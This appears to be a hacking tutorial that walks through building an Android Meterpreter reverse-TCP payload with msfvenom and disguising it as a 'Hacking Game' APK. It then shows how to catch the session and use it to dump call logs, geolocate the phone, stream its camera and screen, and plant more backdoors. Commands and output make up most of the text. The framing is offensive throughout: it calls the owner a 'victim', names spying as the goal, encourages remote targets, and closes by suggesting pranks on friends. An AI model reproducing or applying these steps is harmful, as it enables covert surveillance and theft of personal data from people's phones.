# Hacking Into Virtually Any Android Device  
*The first step to becoming a great hacker...Learn EVERYTHING*  
  
## Getting Started;  
I will be utilizing Kali Linux as my Hackers O.S., you can utilize Parrot OS if desired.  
I have a simple Samsung Galaxy S13  
  
The first thing I want to do is perform "ifconfig" in order to get my IP Address;  
```
$ ifconfig  
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet XXX.XXX.XXX.XXX  netmask 255.255.255.0  broadcast XXX.XXX.XXX.XXX
        inet6 XXXC:XXXC:XXXC:XXC::XXXC  prefixlen 128  scopeid 0x0<global>
        inet6 XXXC:XXXC:XXXC:XXC:XXXC:XXXC:XXXX:CCCX  prefixlen 64  scopeid 0x0<global>
        inet6 XXXC:CCCX:CXCX:XXX:CCC:CCXX:XXCC:XXCX  prefixlen 64  scopeid 0x0<global>
        inet6 CCCX::CCC:XXXC:XXCC:CCXC  prefixlen 64  scopeid 0x20<link>
        ether XX:CC:XC:CX:XX:CC  txqueuelen 1000  (Ethernet)
        RX packets 46092  bytes 33835073 (32.2 MiB)
        RX errors 0  dropped 5  overruns 0  frame 0
        TX packets 25389  bytes 6865051 (6.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 10  bytes 580 (580.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10  bytes 580 (580.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
We are looking at our "_eth0_" networking card and will be utilizing the IP Address from the "_inet_" section.  
Now, we can take a look at another program called MSFVenom. We will view the Help guide in order to see what tools we can use.  
Take a moment to look over this document and see what all of our options are and understand them!  
```
$ msfvenom -h
MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] <var=val>
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe

Options:
    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
        --list-options               List --payload <value>'s standard, advanced and evasion options
    -f, --format          <format>   Output format (use --list formats to list)
    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
        --service-name    <value>    The service name to use when generating a service binary
        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
        --smallest                   Generate the smallest possible payload using all available encoders
        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
        --encrypt-key     <value>    A key to be used for --encrypt
        --encrypt-iv      <value>    An initialization vector for --encrypt
    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
        --platform        <platform> The platform for --payload (use --list platforms to list)
    -o, --out             <path>     Save the payload to a file
    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
    -s, --space           <length>   The maximum size of the resulting payload
        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
    -i, --iterations      <count>    The number of times to encode the payload
    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
    -x, --template        <path>     Specify a custom executable file to use as a template
    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
    -h, --help                       Show this message
```
  
## Creating Our Payload  
Okay, we can clearly see that we can save our payload in multiple formats, and .apk (_which is the standard android file_) fits inside of our --payload options.  
So we will create a simple command for msfvenom that will allow us to create a Reverse TCP handshake against our target. Like this;  
```
$ msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP_HERE LPORT=ANY_PORT R> /var/www/Android_File_Name.apk/  
```
Let's break this command down;  
**1** *msfvenom* = We are starting a program called MSF Venom.  
**2** *-p* = We told the program that we are going to generate a payload.  
**3** *android* = We are instructing the program what type of payload we are looking for.  
**3.A** *meterpreter* = The program has been told to use the Meterpreter configurations.  
**3.B** *reverse_tcp* = And we will set the configurations to be a Reverse TCP.  
**4** *LHOST=* = We are setting the Hackers IP Address for the program to listen to.  
**4.A** *YOUR_IP_HERE* = This is where you set your own IP Address as mentioned in ifconfig.  
**5** *LPORT=* = We will be setting the Hackers desired Port for the program to listen on.  
**5.A** *ANY_PORT* = We can use any port, just not any common ones, or ones that are being use.  
**6** *R>* = This tells the program we will be writting it as a Raw Format.  
**7** */var/www/* = This will be the directory in which we store the APK file too.  
**7.A** *Android_File_Name.apk* = The name of our APK file to send to the target.  
**Please Note:** *You can change the name from "Android_File_Name.apk" to something you desire!*  
**Please Note #2:** *If saving the file directory to the /var/www gives issues, save it to your desktop and then copy/paste it to the folder.*  
Here is the exact command I used;  
```
$ sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.177 LPORT=4444 R> /home/cryptoh4ck3r/Desktop/HackingGame.apk  
[sudo] password for cryptoh4ck3r: 
[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
[-] No arch selected, selecting arch: dalvik from the payload
No encoder specified, outputting raw payload
Payload size: 10238 bytes
```
  
Now we will start our Apache2 Server so that other devices may connect to our computer to download our "Hacking Game".  
To do this, we can simply type in;  
```
$ sudo service apache2 start  
  
# To check the status;  
$ sudo service apache2 status
● apache2.service - The Apache HTTP Server
     Loaded: loaded (/lib/systemd/system/apache2.service; disabled; preset: disabled)
     Active: active (running) since Sat 2023-01-07 14:01:53 EST; 5s ago
       Docs: https://httpd.apache.org/docs/2.4/
    Process: 35849 ExecStart=/usr/sbin/apachectl start (code=exited, status=0/SUCCESS)
   Main PID: 35866 (apache2)
      Tasks: 6 (limit: 9019)
     Memory: 19.4M
        CPU: 77ms
     CGroup: /system.slice/apache2.service
             ├─35866 /usr/sbin/apache2 -k start
             ├─35868 /usr/sbin/apache2 -k start
             ├─35869 /usr/sbin/apache2 -k start
             ├─35870 /usr/sbin/apache2 -k start
             ├─35871 /usr/sbin/apache2 -k start
             └─35872 /usr/sbin/apache2 -k start

Jan 07 14:01:52 CryptoH4ck3r systemd[1]: Starting The Apache HTTP Server...
Jan 07 14:01:53 CryptoH4ck3r apachectl[35865]: AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1. Set the 'ServerName' directive globally to suppress this message
Jan 07 14:01:53 CryptoH4ck3r systemd[1]: Started The Apache HTTP Server.

```
  
Now, you can utilize your own web server, as we did above, or you can host the HackingGame.apk file on a 3rd party server such as Google, Dropbox, Microsoft, etc.  
## Setting Up MSFConsole  
With everything setup & working properly, we initiate our MSFConsole. This will allow us use the multi-handler exploit in order to gain access to our target!  
Now you can simply type the following in;  
```
$ msfconsole  
  
> use multi/handler  
  
> set PAYLOAD android/meterpreter/reverse_tcp
  
> show options  
Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (android/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.
  
> set LHOST 192.168.1.177  
LHOST => 192.168.1.177  
> set LPORT 4444  
LPORT => 4444  
  
> exploit
```
**Please Note:** - Set the LHOST & LPORT to your IP Address on YOUR computer and the Port you used earlier when we created the payload!  
Once your target has downloaded & installed the APK file, our terminal should look like this;  
```
[*] Started reverse TCP handler on 192.168.1.177:4444 
[*] Sending stage (78179 bytes) to 192.168.1.99
[*] Meterpreter session 1 opened (192.168.1.177:4444 -> 192.168.1.99:51660) at 2023-01-07 14:10:40 -0500

meterpreter > 
```
**SUCCESS!!!** We just hacked our first Android Device!  
  
## Meterpreter Commands  
What good does gaining access to the Device if we don't know what to do!?!?!

The first thing we can do is discover the background process running and then check out the sessions;  
```
meterpreter > background  
[*] Backgrounding session 1...  
  
meterpreter > sessions  
Active sessions
===============

  Id  Name  Type                        Information          Connection
  --  ----  ----                        -----------          ----------
  1         meterpreter dalvik/android  u0_a342 @ localhost  192.168.1.177:4444 -> 192.168.1.99:51660 (192.168.1.99)
  
meterpreter > sessions -i 1  
[*] Starting interaction with 1...  
```
  
Okay, so we officially connected our Kali Machine to our target's android phone! Now what?  
We can see the full list of the users applications like this;  
```
meterpreter > app_list  
meterpreter > app_list
Application List
================

  Name                                                                  Package                                                               Running  IsSystem
  ----                                                                  -------                                                               -------  --------
  3 Button Navigation Bar                                               com.android.internal.systemui.navbar.threebutton                      false    true
  AASAservice                                                           com.samsung.aasaservice                                               false    true
  AR Doodle                                                             com.samsung.android.ardrawing                                         false    true
  AR Emoji                                                              com.samsung.android.aremoji                                           false    true
  AR Emoji Editor                                                       com.samsung.android.aremojieditor                                     false    true
  AR Emoji Stickers                                                     com.sec.android.mimage.avatarstickers                                 false    true
  AR Zone                                                               com.samsung.android.arzone                                            false    true
  Accessibility                                                         com.samsung.accessibility                                             false    true
  Adapt Sound                                                           com.sec.hearingadjust                                                 false    true
  Amazon Alexa                                                          com.amazon.dee.app                                                    false    false
  Amazon Music                                                          com.amazon.mp3                                                        false    false
  Amazon Shopping                                                       com.amazon.mShop.android.shopping                                     false    false
```
This screen will allow us to easily see what programs (apks) our victim currently has installed on their device.  
We can type "help" and get a full list of actions we can take;  
```
meterpreter > help  
Application Controller Commands
===============================

    Command        Description
    -------        -----------
    app_install    Request to install apk file
    app_list       List installed apps in the device
    app_run        Start Main Activty for package name
    app_uninstall  Request to uninstall application

```
I copied the contents of the Application Controller commands as I still want to play with this!  
As we can see, we can easily install, run, or uninstall Applications on our target!  
  
We can check to see if our target is rooted. This would be a crucial step to know if you are planning on installing  
APK's that require the device to be rooted;  
```
meterpreter > check_root
[*] Device is not rooted
```
Want to really freak out your victim? We can even play audio files remotely like this;  
```
meterpreter > play /path/to/audio_file.mp3  
[*] Playing /home/cryptoh4ck3r/Downloads/live-hip-hop-loop-81bpm-131102.mp3...
[*] Done
```
  
Okay, enough of the funny business. When we are attacking our targets, generally speaking, we are wanting to actually obtain information.  
And we can do that by the following;  
**Get the targets Call Log;**  
```
meterpreter > dump_calllog
[*] Fetching 51 entries
[*] Call log saved to calllog_dump_20230107142352.txt
```
**Get the targets Contacts;**  
```
meterpreter > dump_contacts  
[*] No contacts were found!
```
**Get the GeoLocation of our Target;**  
```
meterpreter > geolocate  
[*] Current Location:
        Latitude:  35.0235489
        Longitude: -92.123515657

To get the address: https://maps.googleapis.com/maps/api/geocode/json?latlng=35.0235489,-92.123515657&sensor=true
```
**Spying on our Target;** 
*Spying is the ultimate goal for virtually any hacker, and with meterpreter, we can see how easy it is;*  
```
meterpreter > webcam_list  
1: Back Camera
2: Front Camera
  
meterpreter > webcam_stream Front Camera
[*] Starting...
[*] Preparing player...
[*] Opening player at: /home/cryptoh4ck3r/xZUQotbg.html
[*] Streaming...
```
  
**We can also see exactly what our victim is doing on their phone in real time;**  
```
meterpreter > screenshare  
[*] Preparing player...
[*] Opening player at: /home/cryptoh4ck3r/oHLErIfZ.html
[*] Streaming...
```
  
**See something juicy? Take a screenshot like this;**  
```
meterpreter > screenshot  
[-] No screenshot data was returned.  
```
  
**Local Commands;**  
*You can use the targets android device just like a regular Linux machine;  
```
meterpreter > help  
Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    del           Delete the specified file
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcat          Read the contents of a local file to the screen
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    upload        Upload a file or directory
```
And from here, we can discover what documents that our target has. This can include things such as;  
* Photos  
* Text Documents  
* 3rd Party APK's 
* etc.  
These commands here allows us to upload and download files directly to our target!  
Now this can be very beneficial for us as we can upload other backdoors to our target.  
We all know Android runs on Java, and if we look at [PenTestMonkey.Net](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) we can see that there is a Java reverse  
shell script we can try to execute on our target!  
  
## Get Creative!  
Now that you have a general understanding of how this actually works. Maybe you can take it a step further? Try to enhance the APK file by loading it into an APK file editor  
such as Android Studio or something and make it actually do something!  
Discover ways you can exploit your target off of your network. Say they are in Houston Texas, and you are in Faribanks Alaska.  
Prank your friends with this awesome exploit!  

